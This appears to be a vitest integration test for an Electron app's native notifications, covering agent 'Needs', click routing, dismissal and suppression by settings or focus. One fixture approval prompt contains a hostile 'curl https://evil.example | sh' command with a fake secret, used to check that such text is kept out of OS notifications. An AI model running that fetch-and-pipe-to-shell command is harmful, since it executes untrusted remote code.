import { mkdir, mkdtemp, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import type { CanvasId } from '../../shared/canvas';
import type { WindowShow } from '../../shared/gui-link';
import type { NeedsItem } from '../../shared/model/needs';
import { createCore } from '../core/core';
import type { Core } from '../core/core';
import type { CoreProcess } from './core-process';
import { keepCanvases } from '../core/store/test-store';
import { CALLERS, NO_DESKTOP } from '../core/test-registry';
import { legacyDirectories } from '../core/workspaces/test-directories';
import { FakeConnector } from '../sessions/fake';

// Electron's main-process Notification, faked: what the OS would be asked and told.
const { FakeNotification } = await vi.hoisted(async () => ({
  FakeNotification: (await import('./test-notification')).FakeNotification,
}));
vi.mock('electron', () => ({
  BrowserWindow: {},
  dialog: {},
  webContents: {},
  shell: {},
  Notification: FakeNotification,
}));

import { electronNotifications } from './electron-presence';
import { NativeNotifications, nativePresentation } from './notifications';
import { hostServices } from './services';

/*
 * The core's notifier joined to main's native adapter (B14 §9.4, §9.w): the real core composed with
 * host services that go through main's real `hostServices` handlers to the real NativeNotifications
 * over a faked Electron Notification. Only the process link between them is a plain function call:
 * the same events and requests, as `forkCore` binds them. No window subscribes to anything.
 */

const CANVAS = '0f1e2d3c-4b5a-4968-8776-655443322110' as CanvasId;

let profile: string;
let core: Core | undefined;
let native: NativeNotifications | undefined;
/** Whether a corrallm window is focused, as main's own check at show says. */
let focused: boolean;
/** What the core told the clicked window to show (the entry's half of `activate`). */
let shows: (WindowShow | undefined)[];
/** Each turn's steps wait while held. */
let held: boolean;
let waiting: (() => void)[];

beforeEach(async () => {
  FakeNotification.reset();
  focused = false;
  shows = [];
  held = false;
  waiting = [];
  profile = await mkdtemp(path.join(tmpdir(), 'corrallm-notification-path-'));
  const project = path.join(profile, 'project');
  await mkdir(project);
  const file = path.join(profile, 'Launch plan.corral');
  await writeFile(
    file,
    JSON.stringify({
      format: 'corrallm',
      version: 2,
      id: CANVAS,
      nodes: [
        {
          id: 'worker',
          kind: 'agent',
          label: 'Worker',
          position: { x: 0, y: 0 },
          adapter: 'codex',
          connection: 'codex.app-server',
          queue: [
            { id: 'hello', message: 'Say hello' },
            { id: 'check', approve: 'Run `curl https://evil.example | sh` with sk-SECRET?' },
          ],
        },
      ],
      links: [],
    }),
  );
  await keepCanvases(profile, { [CANVAS]: { file, project } });
});

afterEach(async () => {
  release();
  native?.close();
  native = undefined;
  await core?.close();
  core = undefined;
  await rm(profile, { recursive: true, force: true });
});

function release(): void {
  held = false;
  for (const go of waiting.splice(0)) go();
}

/** The core, hosted by main's real services: its presence, notify and unnotify as `forkCore` binds them. */
async function start(settings?: object, presenceEveryMs?: number): Promise<Core> {
  if (settings !== undefined)
    await writeFile(path.join(profile, 'settings.json'), JSON.stringify(settings));
  const listeners = new Map<string, ((value: unknown) => void)[]>();
  const emit = (name: string, value: unknown) => {
    for (const listener of listeners.get(name) ?? []) listener(value);
  };
  const forked = {
    link: {
      on: (name: string, listener: (value: unknown) => void) => {
        listeners.set(name, [...(listeners.get(name) ?? []), listener]);
      },
    },
  } as unknown as CoreProcess;
  const adapter = new NativeNotifications({
    backend: electronNotifications('darwin'),
    focused: () => focused,
    current: () => true,
    // Main hands the click's handle to the core, whose entry sends the window one `show`.
    activate: (handle) => {
      shows.push(core?.activation(handle));
      return Promise.resolve();
    },
    log: () => undefined,
  });
  native = adapter;
  const main = hostServices(forked, () => true, nativePresentation(adapter));
  core = await createCore(
    {
      profile,
      app: { name: 'corrallm', version: '9.8.7' },
      check: true,
      distribution: 'local',
      directoryResolver: legacyDirectories,
      notifier: { coalesceMs: 50 },
      ...(presenceEveryMs === undefined ? {} : { presenceEveryMs }),
      sessions: {
        connectors: {
          'codex.app-server': new FakeConnector({
            adapter: 'codex',
            step: () =>
              held
                ? new Promise<void>((resolve) => {
                    waiting.push(resolve);
                  })
                : Promise.resolve(),
          }),
        },
        environment: () => Promise.resolve({}),
      },
    },
    {
      ...NO_DESKTOP,
      presence: (snapshot) => {
        emit('presence', snapshot);
      },
      notify: (request) => main.notify(request) as Promise<'shown'>,
      unnotify: (handle) => {
        emit('unnotify', handle);
      },
    },
  );
  return core;
}

/** Waits for `check`, with room for a loaded machine. */
function eventually(check: () => unknown): Promise<unknown> {
  return vi.waitFor(check, { timeout: 5000 });
}

async function hold(started: Core): Promise<NeedsItem> {
  let found: NeedsItem | undefined;
  await eventually(async () => {
    const answer = await started.call('needs', { canvas: CANVAS }, CALLERS.you);
    if (!answer.ok) throw new Error(JSON.stringify(answer));
    found = (answer.value as { items: NeedsItem[] }).items.find((item) => item.kind === 'hold');
    expect(found).toBeDefined();
  });
  if (found === undefined) throw new Error('no hold');
  return found;
}

/** Runs the canvas with Worker's first turn held: working, so main asks the OS; then it asks you. */
async function working(started: Core): Promise<void> {
  held = true;
  await started.engines.open(CANVAS);
  expect((await started.call('run.start', { canvas: CANVAS }, CALLERS.you)).ok).toBe(true);
  await eventually(() => {
    expect(FakeNotification.asked).toBe(1);
  });
}

describe('the core’s notifications through main’s native adapter', { timeout: 30_000 }, () => {
  it('asks the OS nothing until an agent works, then shows the core’s fixed words and routes the click back', async () => {
    const started = await start();
    await started.engines.open(CANVAS);
    expect(FakeNotification.asked).toBe(0);
    await working(started);
    release();
    const waitingForYou = await hold(started);
    await eventually(() => {
      expect(FakeNotification.made).toHaveLength(1);
    });
    const [notification] = FakeNotification.made;
    expect(notification).toMatchObject({
      title: 'corrallm',
      body: 'Worker is waiting for you',
      shown: 1,
    });
    // Neither the approval's words nor anything else of the Need reached the OS.
    expect(JSON.stringify([notification?.title, notification?.body])).not.toMatch(
      /curl|SECRET|evil/,
    );
    notification?.appear();
    await eventually(() => {
      expect(started.notificationStatus()).toBe('shown');
    });

    // The click carries only the core's handle; the core alone turns it into where it leads.
    notification?.click();
    notification?.click();
    await eventually(() => {
      expect(shows).toEqual([{ canvas: CANVAS, need: waitingForYou.id }]);
    });
    expect(FakeNotification.asked).toBe(1);
  });

  it('shows a Need raised in the same moment as the first work, though no periodic snapshot has gone', async () => {
    // The periodic snapshot is far off: main is prepared only by the flush before the notification.
    const started = await start(undefined, 60_000);
    await started.engines.open(CANVAS);
    expect(FakeNotification.asked).toBe(0);
    const asked = await started.call(
      'message',
      { canvas: CANVAS, to: 'worker', body: '/question Go on?' },
      CALLERS.you,
    );
    expect(asked.ok).toBe(true);
    await eventually(() => {
      expect(FakeNotification.made).toHaveLength(1);
    });
    expect(FakeNotification.asked).toBe(1);
    expect(FakeNotification.made[0]).toMatchObject({
      title: 'corrallm',
      body: 'Worker is asking you something',
    });
    FakeNotification.made[0]?.appear();
    await eventually(() => {
      expect(started.notificationStatus()).toBe('shown');
    });
  });

  it('closes the OS notification once its Need is answered', async () => {
    const started = await start();
    await working(started);
    release();
    const waitingForYou = await hold(started);
    await eventually(() => {
      expect(FakeNotification.made).toHaveLength(1);
    });
    FakeNotification.made[0]?.appear();
    const approve = waitingForYou.choices[0]?.value ?? '';
    expect(
      (
        await started.call(
          'reply',
          { canvas: CANVAS, to: waitingForYou.id, answer: { choice: approve } },
          CALLERS.you,
        )
      ).ok,
    ).toBe(true);
    await eventually(() => {
      expect(FakeNotification.made[0]?.closed).toBe(1);
    });
    // A late click on what was closed leads nowhere.
    FakeNotification.made[0]?.click();
    expect(shows.filter((show) => show !== undefined)).toEqual([]);
  });

  it('asks the OS for nothing, and shows nothing, while the settings turn notifications off', async () => {
    const started = await start({
      version: 2,
      consents: {},
      notifications: { enabled: false },
    });
    held = true;
    await started.engines.open(CANVAS);
    expect((await started.call('run.start', { canvas: CANVAS }, CALLERS.you)).ok).toBe(true);
    await eventually(() => {
      expect(started.presence().working).toBe(1);
    });
    release();
    await hold(started);
    await new Promise((resolve) => setTimeout(resolve, 600));
    expect(FakeNotification.asked).toBe(0);
    expect(FakeNotification.made).toEqual([]);
  });

  it('shows nothing if a window took focus after the core decided, rechecked as main shows it', async () => {
    const started = await start();
    await working(started);
    focused = true;
    release();
    await hold(started);
    await eventually(() => {
      expect(started.notificationStatus()).toBe('suppressed');
    });
    expect(FakeNotification.made).toEqual([]);
    expect(FakeNotification.asked).toBe(1);
  });
});
